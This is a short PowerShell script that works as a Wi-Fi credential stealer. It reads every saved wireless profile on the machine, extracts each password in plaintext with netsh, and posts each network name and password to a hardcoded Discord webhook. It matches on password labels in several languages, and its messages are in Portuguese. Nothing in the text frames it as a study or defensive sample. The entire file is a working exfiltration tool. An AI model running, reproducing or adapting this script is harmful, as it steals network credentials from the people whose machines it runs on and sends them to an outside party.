$Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T1beCpyWBO6khVVdCK66sy8a083xDZqRSyY5w5PDHDciVnh2ImDB"
$profiles=netsh wlan show profile | ForEach-Object { ($_ -split ':')[1].Trim() }
foreach ($p in $profiles) {
    $details=netsh wlan show profile name="$p" key=clear
    $passLine=$details | Select-String "Key Content|Contenuto chiave|Inhaltsschl|Contenido de la clave"
    if ($passLine) { $password=($passLine -split ':')[1].Trim() } else { $password='[Sem senha / não encontrado]' }
    $json=@{content="Wi-Fi: $p | Senha: $password"} | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri $Webhook -Method Post -Body $json -ContentType "application/json"
}
